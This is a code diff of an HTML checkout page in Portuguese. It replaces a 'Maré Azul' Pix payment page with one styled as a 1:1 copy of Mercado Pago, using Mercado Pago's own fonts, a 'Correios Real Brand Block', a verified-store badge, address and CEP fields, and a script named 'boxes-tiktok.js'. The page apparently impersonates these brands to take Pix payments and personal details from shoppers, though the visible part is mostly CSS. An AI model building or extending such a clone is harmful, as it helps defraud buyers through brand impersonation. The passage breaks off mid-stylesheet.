@@ -1,226 +1,1753 @@
 <!doctype html>
 <html lang="pt-BR">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<style>html{touch-action:pan-x pan-y}</style>
-<title>Pagamento Pix — Maré Azul</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<style>*{box-sizing:border-box}body{margin:0;background:#f2f6fc;color:#0a2058;font:14px 'Inter',Arial,sans-serif;line-height:1.5}svg{fill:none;stroke:currentColor;stroke-width:1.9;stroke-linecap:round;stroke-linejoin:round}button,textarea{font:inherit}button{cursor:pointer}.payment-shell{max-width:440px;margin:0 auto;background:#fff;min-height:100vh;box-shadow:0 8px 35px #16365814}.payment-hero{position:relative;overflow:hidden;background:radial-gradient(circle at 90% 0,#0874d7 0,transparent 45%),linear-gradient(125deg,#053586,#001e61);padding:28px 24px 38px;text-align:center;color:#fff}.payment-hero:before,.payment-hero:after{content:'';position:absolute;width:160px;height:160px;border-radius:50%;background:#086bdf38;pointer-events:none}.payment-hero:before{left:-115px;top:-35px}.payment-hero:after{right:-100px;top:60px}.hero-clock{position:relative;width:58px;height:58px;margin:0 auto 12px;display:grid;place-items:center;border-radius:50%;background:linear-gradient(135deg,#09cfa6,#0879c6 70%);box-shadow:inset 0 0 12px #ffffff20}.hero-clock svg{width:33px;height:33px}.payment-hero h1{position:relative;font-size:24px;line-height:1.3;letter-spacing:-.5px;margin:0 0 7px;font-weight:800}.payment-hero>p{position:relative;font-size:13px;line-height:1.5;margin:0;color:#e9f1ff}.deadline{position:relative;margin:20px auto 0;border:1px solid #258aff66;background:#001f5680;border-radius:13px;padding:9px 12px 7px;max-width:310px}.deadline span{display:block;font-size:12px}.deadline strong{display:block;font-size:31px;line-height:1.3;color:#a6ebc1;font-variant-numeric:tabular-nums;font-weight:800}.progress{height:2px;background:#ffffff14;overflow:hidden;border-radius:5px;margin-top:5px}.progress span{display:block;height:100%;background:#87e8b2;width:100%}.payment-content{position:relative;margin-top:-20px;border-radius:23px 23px 0 0;background:#fff;padding:19px 17px 23px}.copy-heading{display:flex;gap:12px;align-items:center;margin:0 5px 15px}.copy-heading>svg{color:#00b394;width:40px;height:40px;flex-shrink:0}h2{font-size:15px;line-height:1.4;margin:0;font-weight:800;letter-spacing:-.2px}.copy-heading p,.qr-summary p{font-size:11px;color:#687faa;margin:3px 0 0}.code-box{position:relative}textarea{display:block;width:100%;height:66px;border:1px solid #d6e8ff;border-radius:12px;background:#f0f7ff;padding:12px 43px 12px 12px;color:#29426c;font-size:11px;line-height:1.7;resize:none;overflow:hidden}.code-box>svg{position:absolute;right:12px;top:22px;width:20px;height:20px;color:#0877ff;pointer-events:none}.copy-button{width:100%;min-height:48px;border:0;border-radius:10px;background:linear-gradient(115deg,#09aa69,#007e3d);color:#fff;font-weight:700;font-size:15px;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:11px;box-shadow:0 5px 12px #00874714}.copy-button svg{width:19px;height:19px}.copy-button:disabled{background:#b5c4d4;cursor:default;box-shadow:none}.copy-feedback{font-size:11px;text-align:center;color:#008b4e;margin:7px 0 0}.copy-feedback:empty{display:none}.code-trust{display:flex;align-items:center;gap:7px;font-size:10px;color:#647faa;margin:11px 8px 15px}.code-trust svg{color:#07874c;width:15px;height:15px;flex-shrink:0}.qr-section{border:1px solid #e1ecfa;border-radius:13px;background:#fff;margin-bottom:16px}.qr-section summary{list-style:none;display:flex;gap:12px;align-items:center;padding:13px;cursor:pointer}.qr-section summary::-webkit-details-marker{display:none}.qr-summary>svg{width:27px;height:27px;color:#0755f3;flex-shrink:0}.qr-summary h2{font-size:14px}.qr-summary .chevron{margin-left:auto;width:17px;height:17px;color:#164b9c;transition:transform .2s}.qr-section[open] .chevron{transform:rotate(180deg)}.qr-body{padding:0 15px 16px;text-align:center;color:#6a7da0;font-size:11px}.qr-demo{width:155px;height:155px;display:grid;place-items:center;margin:8px auto 12px;border-radius:12px;border:1px dashed #d4e1f1;background:#f8fbff}.qr-demo svg{width:90px;height:90px;color:#92a6c4}.tutorial{padding:15px 10px 11px;border-radius:16px;background:linear-gradient(120deg,#f1faff,#edf5ff)}.tutorial-title{display:flex;align-items:center;gap:9px;margin:0 4px 14px}.tutorial-title>svg{width:22px;height:22px;color:#0877ff}.steps{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:7px}.steps li{background:white;border:1px solid #f1f5fc;border-radius:14px;text-align:center;padding:13px 5px 11px}.steps svg{display:block;width:25px;height:25px;margin:0 auto 6px;color:#1680ff}.steps strong{display:block;font-size:14px;color:#103e8b}.steps p{font-size:11px;line-height:1.45;color:#5a75a3;margin:1px 0 0}.confirmation{display:flex;align-items:flex-start;gap:10px;background:#e5f3ff;padding:12px 10px;border-radius:12px;margin-top:12px}.confirmation svg{width:23px;height:23px;flex-shrink:0;color:#0877ff;margin-top:2px}.confirmation p{font-size:10px;line-height:1.6;margin:0;color:#5279ad}.demo{font-size:10px;line-height:1.5;color:#7889a1;text-align:center;margin:17px 7px 0}.back{display:block;text-align:center;color:#617a9e;font-size:11px;margin-top:16px}.expired-message{padding:10px;border-radius:10px;background:#fff1e8;color:#98512e;font-size:12px;margin-top:12px}.expired-message[hidden]{display:none}.expired .deadline strong{color:#ffd0aa}button:focus-visible,a:focus-visible,summary:focus-visible,textarea:focus-visible{outline:2px solid #0877ff;outline-offset:3px}@media(min-width:600px){.payment-shell{min-height:0;margin:30px auto;border-radius:24px;overflow:hidden;border:1px solid #dce7f4}.payment-content{padding-bottom:25px}}@media(max-width:340px){.payment-content{padding:17px 12px 22px}.payment-hero h1{font-size:22px}.steps p{font-size:10px}.copy-heading{gap:9px}}
-body{background:#f6f9fd;color:#081b57}.payment-shell{background:#fff;padding:18px 14px 20px;box-shadow:0 5px 25px #16365809}.payment-hero{background:transparent;color:#081b57;padding:0;text-align:left;overflow:visible}.payment-hero:before,.payment-hero:after{display:none}.payment-status-card{display:flex;align-items:center;gap:15px;border:1px solid #d8eaff;border-radius:17px;padding:17px 13px;background:linear-gradient(115deg,#fcfeff,#fff)}.hero-clock{width:72px;height:72px;margin:0;border:8px solid #e4faf0;background:#c3f1dc;box-shadow:none;flex-shrink:0;color:#00804e}.hero-clock svg{width:42px;height:42px;stroke-width:2.2}.payment-hero h1{font-size:23px;line-height:1.15;margin:0 0 8px;letter-spacing:-.5px}.payment-status-copy p{font-size:12px;color:#5573a0;line-height:1.45;margin:0}.deadline{max-width:none;background:linear-gradient(110deg,#eafaf2,#edfbf5);border:0;padding:12px;margin:12px 0 14px;text-align:center;border-radius:16px}.deadline span{font-size:14px;color:#046c44}.deadline strong{color:#007d48;font-size:40px;line-height:1.2;margin-top:4px}.progress{background:#cfeedd;margin-top:7px}.progress span{background:#09a967}.payment-content{padding:0;margin:0;border-radius:0}.payment-content>section[aria-label="Pix copia e cola"]{border:1px solid #d8eaff;border-radius:17px;padding:15px 12px;margin-bottom:14px}.copy-heading{gap:12px;margin:0 3px 12px}.copy-heading>svg{width:42px;height:42px}h2{font-size:16px;line-height:1.35;color:#081b57}.copy-heading p{font-size:12px;line-height:1.45;color:#5875a2}textarea{height:86px;font-size:12px;line-height:1.55;padding:12px 42px 12px 12px;border-color:#d6eaff}.code-box>svg{top:31px;width:22px;height:22px}.copy-button{min-height:50px;font-size:17px;border-radius:12px;background:linear-gradient(110deg,#009355,#007440);margin-top:10px;box-shadow:none}.copy-button svg{width:22px;height:22px}.code-trust{font-size:11px;gap:8px;margin:12px 5px 0;color:#5875a2}.code-trust svg{width:18px;height:18px}.qr-section{border-color:#d8eaff;border-radius:16px;margin-bottom:12px}.qr-section summary{padding:15px 12px;gap:13px}.qr-summary>svg{width:30px;height:30px}.qr-summary h2{font-size:16px}.qr-summary p{font-size:12px}.tutorial{padding:15px 13px;border:1px solid #e4f2ff;border-radius:17px;background:linear-gradient(115deg,#f0f9ff,#edf7ff)}.tutorial-title{gap:12px;margin:0 0 12px}.tutorial-title>svg{width:30px;height:30px;padding:5px;background:#cce9ff;border-radius:50%;box-sizing:content-box}.tutorial-title h2{font-size:17px}.steps{display:grid;grid-template-columns:1fr;gap:8px}.steps li{display:flex;align-items:center;gap:12px;background:transparent;border:0;padding:0;text-align:left;border-radius:0}.steps strong{display:grid;place-items:center;width:31px;height:31px;flex-shrink:0;background:#086cf1;color:#fff;border-radius:50%;font-size:17px;font-weight:500}.step-icon{width:32px;height:32px;border-radius:50%;background:#d9efff;display:grid;place-items:center;flex-shrink:0}.steps .step-icon svg{width:20px;height:20px;margin:0;color:#0877ff}.steps p{font-size:13px;color:#17366c;margin:0;line-height:1.4}.confirmation{padding:15px 13px;border-radius:17px;background:#eaf6ff;margin-top:12px;gap:12px}.confirmation svg{width:28px;height:28px}.confirmation p{font-size:12px;line-height:1.5;color:#5274a6}.expired .deadline strong{color:#a6532b}@media(min-width:600px){.payment-shell{padding:22px 18px}.payment-content{padding:0}}@media(max-width:340px){.payment-shell{padding:14px 11px}.hero-clock{width:62px;height:62px;border-width:7px}.hero-clock svg{width:35px;height:35px}.payment-status-card{gap:11px;padding:15px 10px}.payment-hero h1{font-size:21px}.payment-status-copy p{font-size:11px}.steps li{gap:9px}.steps p{font-size:12px}}
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>Pague com Pix — Mercado Pago</title>
+  <link rel="preconnect" href="https://http2.mlstatic.com">
+  <script type="module" src="/assets/boxes-tiktok.js?v=2"></script>
+  <style>
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 600;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
+}
+@font-face {
+  font-family: 'Proxima Nova';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-bold.woff2') format('woff2');
+}
 
-/* Reference proportions scaled to a mobile viewport. */
-body{font-family:'Inter',Arial,sans-serif;background:radial-gradient(ellipse at 5% 30%,#e7f8f8 0,transparent 35%),radial-gradient(ellipse at 95% 80%,#e6f7fb 0,transparent 40%),#f7fbfd;color:#071e58}.payment-shell{background:linear-gradient(140deg,#f9fcfe,#eff8fc);padding:18px 13px 22px;box-shadow:none}.payment-status-card{border:0;border-radius:18px;padding:12px 14px;gap:16px;background:#fff;box-shadow:0 4px 10px #1742670c;min-height:108px}.hero-clock{width:84px;height:84px;border-width:9px;background:#baf1dc;border-color:#e8faf3}.hero-clock svg{width:49px;height:49px;stroke-width:2.4}.payment-hero h1{font-size:25px;line-height:1.04;font-weight:800;letter-spacing:-.7px;margin-bottom:9px}.payment-status-copy{min-width:0}.payment-status-copy p{font-size:13px;line-height:1.4;color:#4766a4}.deadline{isolation:isolate;overflow:hidden;border:2px solid #fff;border-radius:18px;background:linear-gradient(115deg,#f1fcf7,#e7f9f1);padding:10px 12px 7px;margin:9px 0 11px}.deadline:after{content:'';position:absolute;z-index:-1;width:180px;height:55px;border-radius:55% 40% 0 0;right:-45px;bottom:-10px;transform:rotate(-35deg);background:#bceee45e;box-shadow:0 -28px 0 #c9f3eb60}.deadline span{font-size:16px;color:#153563}.deadline strong{font-size:43px;font-weight:800;line-height:1.15;margin-top:5px;letter-spacing:-1px;color:#008254}.progress{height:2px;opacity:.35}.payment-content>section[aria-label="Pix copia e cola"]{border:0;border-radius:18px;background:#fff;padding:13px 11px 12px;box-shadow:0 5px 12px #184c6e0c;margin-bottom:10px}.copy-heading{gap:14px;margin:0 5px 11px}.copy-heading>svg{width:43px;height:43px}.copy-heading h2{font-size:19px;font-weight:800;letter-spacing:-.55px;line-height:1.3}.copy-heading p{font-size:13px;line-height:1.4;margin-top:3px;color:#4e6caa}textarea{height:90px;border-radius:12px;background:#f4faff;border-color:#d6eaff;font-family:'Inter',Arial,sans-serif;font-size:12px;line-height:1.45;color:#15316c;padding:12px 38px 12px 12px}.code-box>svg{top:32px;width:23px;height:23px}.copy-button{min-height:51px;border-radius:13px;font-size:19px;font-weight:700;background:linear-gradient(110deg,#159f70,#007346);box-shadow:inset 0 1px 0 #43c99955;gap:15px;margin-top:8px}.copy-button svg{width:25px;height:25px}.code-trust{font-size:12px;margin:10px 14px 0;gap:11px;line-height:1.4;color:#4b69a9}.code-trust svg{width:22px;height:22px}.qr-section{border:0;border-radius:17px;background:#fff;box-shadow:0 4px 10px #184c6e0c;margin-bottom:10px}.qr-section summary{padding:11px 12px;gap:12px}.qr-summary>svg:first-child{box-sizing:content-box;width:30px;height:30px;border-radius:50%;padding:9px;background:#e6f6ff;color:#0877ff}.qr-summary h2{font-size:17px;letter-spacing:-.45px;font-weight:800}.qr-summary p{font-size:12px;color:#4e6caa}.tutorial{border:0;border-radius:18px;background:linear-gradient(110deg,#fff,#fbfdff);box-shadow:0 4px 12px #184c6e0c;padding:12px 15px}.tutorial-title{gap:17px;margin-bottom:9px}.tutorial-title>svg{width:25px;height:25px;padding:7px;background:#d5f0ff}.tutorial-title h2{font-size:18px;font-weight:800;letter-spacing:-.45px}.steps{gap:6px;position:relative}.steps:before{content:'';position:absolute;left:17px;top:20px;bottom:20px;border-left:2px dashed #a5d4ff}.steps li{position:relative;gap:13px}.steps strong{width:34px;height:34px;background:linear-gradient(135deg,#20a7ff,#006aff);font-size:18px;font-weight:600}.step-icon{width:36px;height:36px;background:#e1f4ff}.steps .step-icon svg{width:22px;height:22px}.steps p{font-size:13px;line-height:1.4;color:#102c65}.confirmation{padding:13px 17px;background:linear-gradient(120deg,#e6f7ff,#e2f5ff);border:1px solid #f9fdff;box-shadow:0 4px 9px #184c6e07;border-radius:18px;gap:14px;margin-top:9px}.confirmation svg{width:29px;height:29px;margin-top:3px}.confirmation p{font-size:12px;line-height:1.45;color:#3464bf}@media(min-width:600px){.payment-shell{padding:22px 16px}}@media(max-width:350px){.hero-clock{width:70px;height:70px;border-width:8px}.hero-clock svg{width:40px;height:40px}.payment-status-card{gap:12px;padding:12px}.payment-hero h1{font-size:23px}.payment-status-copy p{font-size:12px}.copy-heading h2{font-size:17px}.copy-heading p{font-size:12px}.steps li{gap:10px}.steps p{font-size:12px}.code-trust{font-size:11px;margin-left:7px;margin-right:7px}}
+:root {
+  --mp-blue: #009ee3;
+  --mp-blue-hover: #0084c2;
+  --mp-navy: #002c6c;
+  --bg-page: #f5f6f8;
+  --bg-card: #ffffff;
+  --border-card: #e2e8f0;
+  --border-input: #cbd5e1;
+  --text-main: #0f172a;
+  --text-sub: #475569;
+  --font-base: 'Proxima Nova', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
 
-/* Yellow clock indicates pending payment. */
-.hero-clock{color:#b77908;background:#ffe8a6;border-color:#fff7df}
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  -webkit-tap-highlight-color: transparent;
+}
 
-.payment-status-card{position:relative;overflow:hidden}.payment-status-card::before{content:'';position:absolute;left:0;top:17px;bottom:17px;width:3px;border-radius:0 3px 3px 0;background:#edbd48}
-[hidden]{display:none!important}.qr-code{display:grid;place-items:center;margin:8px auto 12px}.qr-code canvas{max-width:100%;height:auto!important}.payment-reference{font-size:11px;color:#61748c;overflow-wrap:anywhere;text-align:center;margin-top:16px}#retryPayment{margin:12px auto;background:#f0f7ff;border:1px solid #d6e8ff;border-radius:10px;padding:10px 16px;font:inherit}#paymentStatus{overflow-wrap:anywhere}
-.copy-icon{position:absolute;right:0;top:50%;transform:translateY(-50%);width:44px;height:44px;padding:10px;border:0;border-radius:8px;background:transparent;color:#0877ff;display:grid;place-items:center}.copy-icon svg{width:23px;height:23px}.copy-icon:focus-visible{outline:2px solid #0877ff;outline-offset:-3px}.copy-icon:disabled{cursor:default;opacity:.5}
+html, body {
+  background-color: var(--bg-page);
+  color: var(--text-main);
+  font-family: var(--font-base);
+  font-size: 15px;
+  font-weight: 500;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+}
+
+[hidden] { display: none !important; }
+button, input, select { font: inherit; }
+button { cursor: pointer; border: 0; background: none; }
+button:disabled { cursor: not-allowed; opacity: 0.6; }
+a { color: inherit; text-decoration: none; }
+
+.checkout-shell {
+  width: 100%;
+  max-width: 520px;
+  margin: 0 auto;
+  min-height: 100vh;
+  padding: 16px 16px 48px;
+  display: flex;
+  flex-direction: column;
+}
+
+@media (min-width: 640px) {
+  body {
+    background-color: #e9ecef;
+    padding: 32px 16px 64px;
+  }
+  .checkout-shell {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 12px 36px rgba(0, 0, 0, 0.07);
+    border: 1.5px solid #cbd5e1;
+    min-height: auto;
+    padding: 30px 28px 48px;
+  }
+}
+
+/* Header 1:1 Mercado Pago Reference */
+.mp-header {
+  margin-bottom: 16px;
+  display: flex;
+  flex-direction: column;
+  width: 100%;
+}
+.mp-top-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  width: 100%;
+  padding: 2px 2px 14px;
+}
+.mp-logo-img {
+  height: 44px;
+  width: auto;
+  display: block;
+  object-fit: contain;
+}
+.mp-secure-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  color: #475569;
+}
+.mp-secure-lock {
+  width: 15px;
+  height: 15px;
+  stroke: #475569;
+  flex-shrink: 0;
+}
+.mp-secure-text {
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #475569;
+  letter-spacing: -0.1px;
+}
+
+/* Store Partner Card 1:1 */
+.store-partner-card {
+  width: 100%;
+  background: #ffffff;
+  border: 1px solid #e2e8f0;
+  border-radius: 14px;
+  padding: 12px 14px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  box-sizing: border-box;
+}
+.store-avatar {
+  width: 46px;
+  height: 46px;
+  min-width: 46px;
+  border-radius: 50%;
+  background-color: #8b9cb6;
+  color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  font-weight: 700;
+  line-height: 1;
+  text-transform: uppercase;
+  user-select: none;
+}
+.store-info {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  gap: 3px;
+  min-width: 0;
+}
+.store-title-row {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.store-name {
+  font-size: 16px;
+  font-weight: 700;
+  color: #0f172a;
+  line-height: 1.2;
+}
+.store-verified-icon {
+  width: 18px;
+  height: 18px;
+  min-width: 18px;
+  display: block;
+}
+.store-subtext {
+  font-size: 13px;
+  font-weight: 400;
+  color: #64748b;
+  margin: 0;
+  line-height: 1.25;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+/* Product Card */
+.product-card {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 12px;
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.03);
+  margin-bottom: 20px;
+}
+@media (min-width: 640px) {
+  .product-card {
+    background: #f8fafc;
+  }
+}
+.product-thumb {
+  width: 54px;
+  height: 54px;
+  min-width: 54px;
+  max-width: 54px;
+  border-radius: 8px;
+  border: 1px solid #cbd5e1;
+  overflow: hidden;
+  background: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.product-thumb img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+.product-details {
+  flex: 1;
+  min-width: 0;
+}
+.product-title {
+  font-size: 13.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 2px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.product-subtitle {
+  font-size: 12px;
+  font-weight: 500;
+  color: #475569;
+  margin: 0 0 2px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.product-qty {
+  font-size: 11.5px;
+  font-weight: 500;
+  color: #64748b;
+  margin: 0;
+}
+.product-price {
+  font-size: 16px;
+  font-weight: 800;
+  color: #0f172a;
+  white-space: nowrap;
+  flex-shrink: 0;
+  margin-left: auto;
+}
+
+/* Stepper */
+.stepper {
+  display: flex;
+  list-style: none;
+  padding: 0 10px;
+  margin: 14px 0 24px;
+  position: relative;
+}
+.stepper li {
+  flex: 1;
+  position: relative;
+  text-align: center;
+}
+.stepper li:not(:last-child)::after {
+  content: '';
+  position: absolute;
+  top: 16px;
+  left: 50%;
+  width: 100%;
+  height: 3px;
+  background: #cbd5e1;
+  z-index: 1;
+}
+.stepper li.done:not(:last-child)::after,
+.stepper li.completed:not(:last-child)::after {
+  background: #009ee3;
+}
+.stepper button {
+  position: relative;
+  z-index: 2;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+  background: none;
+  border: none;
+  padding: 0;
+}
+.step-circle {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  font-weight: 700;
+  background: #ffffff;
+  color: #64748b;
+  border: 2.5px solid #94a3b8;
+  transition: all 0.2s;
+}
+.step-circle svg {
+  width: 16px;
+  height: 16px;
+  stroke: #ffffff;
+  stroke-width: 3.2;
+  fill: none;
+}
+.stepper li.active .step-circle {
+  background: #009ee3;
+  color: #ffffff;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.2);
+}
+.stepper li.done .step-circle,
+.stepper li.completed .step-circle {
+  background: #009ee3;
+  color: #ffffff;
+  border-color: #009ee3;
+}
+.step-label {
+  font-size: 13.5px;
+  font-weight: 600;
+  margin-top: 6px;
+  color: #64748b;
+}
+.stepper li.active .step-label {
+  color: #0f172a;
+  font-weight: 700;
+}
+.stepper li.done .step-label,
+.stepper li.completed .step-label {
+  color: #334155;
+}
+
+/* Titles */
+.section-title {
+  font-size: 22px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+}
+.section-desc {
+  font-size: 14.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 16px;
+}
+
+/* Form Card */
+.form-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 16px;
+  padding: 20px 18px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+}
+@media (min-width: 640px) {
+  .form-card {
+    background: #f8fafc;
+  }
+}
+
+.field {
+  display: flex;
+  flex-direction: column;
+}
+.field label {
+  font-size: 15px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 6px;
+}
+.field input, .field select {
+  width: 100%;
+  height: 52px;
+  padding: 0 16px;
+  background: #ffffff;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  color: #0f172a;
+  outline: none;
+  box-sizing: border-box;
+  transition: background-color 0.2s, border-color 0.2s, box-shadow 0.2s;
+}
+.field input::placeholder {
+  color: #94a3b8;
+  font-weight: 400;
+}
+/* Fundo azul nos campos de preenchimento quando ativo ou preenchido */
+.field input:focus, .field select:focus {
+  background-color: #f0f9ff;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3.5px rgba(0, 158, 227, 0.2);
+}
+.field input:not(:placeholder-shown) {
+  background-color: #f0f9ff;
+  border-color: #7dd3fc;
+}
+.field input:not(:placeholder-shown):focus {
+  background-color: #e0f2fe;
+  border-color: #009ee3;
+  box-shadow: 0 0 0 3.5px rgba(0, 158, 227, 0.25);
+}
+
+/* Bolinha de check minimalista e elegante (Azul Mercado Pago) */
+.field label {
+  display: flex !important;
+  align-items: center !important;
+  font-size: 14.5px !important;
+  font-weight: 700 !important;
+  color: #0f172a !important;
+  margin-bottom: 6px !important;
+}
+.field-check-badge {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  margin-left: 6px;
+  opacity: 0;
+  transform: scale(0.6);
+  transition: opacity 0.2s cubic-bezier(0.34, 1.56, 0.64, 1), transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+  pointer-events: none;
+  line-height: 1;
+}
+.field-check-badge.active {
+  opacity: 1;
+  transform: scale(1);
+}
+.field-check-badge svg {
+  width: 14px;
+  height: 14px;
+  display: block;
+}
+
+/* Input quando preenchido e válido: suave estilo Mercado Pago */
+.field input.field-valid, .field select.field-valid {
+  background-color: #f0f9ff !important;
+  border-color: #009ee3 !important;
+}
+
+
+.field [aria-invalid="true"] {
+  border-color: #ef4444;
+}
+.field-error {
+  color: #dc2626;
+  font-size: 13px;
+  font-weight: 600;
+  margin-top: 4px;
+}
+.field-error:empty { display: none; }
+
+.fields-grid-2 {
+  display: grid;
+  gap: 12px;
+}
+.fields-grid-2.number-comp {
+  grid-template-columns: 32% calc(68% - 12px);
+}
+.fields-grid-2.city-state {
+  grid-template-columns: calc(70% - 12px) 30%;
+}
+
+.cep-field-wrap {
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+.cep-field-wrap input {
+  padding-right: 115px;
+}
+.btn-buscar-cep {
+  position: absolute;
+  right: 14px;
+  color: #009ee3;
+  font-size: 14.5px;
+  font-weight: 700;
+  padding: 6px 10px;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+.btn-buscar-cep:hover {
+  text-decoration: underline;
+}
+#cepStatus {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #0284c7;
+  margin-top: 5px;
+}
+#cepStatus:empty { display: none; }
+
+/* Shipping Card */
+/* Opções de Entrega 1:1 Correios Reference */
+.shipping-section-header {
+  margin-top: 22px;
+  margin-bottom: 12px;
+  text-align: left;
+}
+.shipping-section-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+  letter-spacing: -0.2px;
+}
+.shipping-section-sub {
+  font-size: 14px;
+  color: #64748b;
+  margin: 0;
+}
+.shipping-options-list {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  margin-bottom: 24px;
+}
+.shipping-option-card {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 16px 16px;
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 16px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+  user-select: none;
+}
+.shipping-option-card.selected {
+  border: 2px solid #009ee3;
+  box-shadow: 0 0 0 1px #009ee3, 0 4px 14px rgba(0, 158, 227, 0.1);
+}
+.ship-radio {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.ship-radio-circle {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  border: 2px solid #94a3b8;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: border-color 0.15s ease, background 0.15s ease;
+}
+.shipping-option-card.selected .ship-radio-circle {
+  border-color: #009ee3;
+  background: #009ee3;
+}
+.ship-radio-dot {
+  width: 9px;
+  height: 9px;
+  border-radius: 50%;
+  background: transparent;
+  transition: background 0.15s ease;
+}
+.shipping-option-card.selected .ship-radio-dot {
+  background: #ffffff;
+}
+
+/* Correios Real Brand Block */
+.ship-brand-col {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  width: 82px;
+}
+.correios-real-logo {
+  width: 80px;
+  height: auto;
+  max-height: 22px;
+  display: block;
+}
+
+/* Ship Info Column */
+.ship-info-col {
+  flex: 1;
+  min-width: 0;
+  text-align: left;
+}
+.ship-title {
+  font-size: 15.5px;
+  font-weight: 700;
+  color: #0f172a;
+  line-height: 1.25;
+  margin-bottom: 3px;
+}
+.ship-deadline {
+  font-size: 13.5px;
+  color: #64748b;
+  margin-bottom: 6px;
+  line-height: 1.3;
+}
+.ship-tags-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  font-size: 12px;
+  color: #64748b;
+}
+.ship-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-size: 12px;
+  color: #64748b;
+}
+.ship-tag svg {
+  stroke: #64748b;
+  flex-shrink: 0;
+}
+.ship-tag-sep {
+  color: #cbd5e1;
+}
+
+/* Badge & Price Column */
+.ship-badge-col {
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+}
+.badge-frete-gratis {
+  display: inline-block;
+  background: #dcfce7;
+  color: #15803d;
+  font-size: 13.5px;
+  font-weight: 700;
+  padding: 6px 14px;
+  border-radius: 20px;
+  white-space: nowrap;
+}
+.price-sedex {
+  font-size: 17px;
+  font-weight: 700;
+  color: #0f172a;
+  white-space: nowrap;
+}
+
+
+/* CEP Modal and Address Finder */
+.btn-link-address-search {
+  background: none;
+  border: none;
+  color: #009ee3;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  padding: 0;
+  text-decoration: underline;
+  text-align: left;
+  font-family: inherit;
+}
+.btn-link-address-search:hover {
+  color: #0084c2;
+}
+.cep-modal-backdrop {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(15, 23, 42, 0.65);
+  backdrop-filter: blur(4px);
+  z-index: 99999;
+  display: flex;
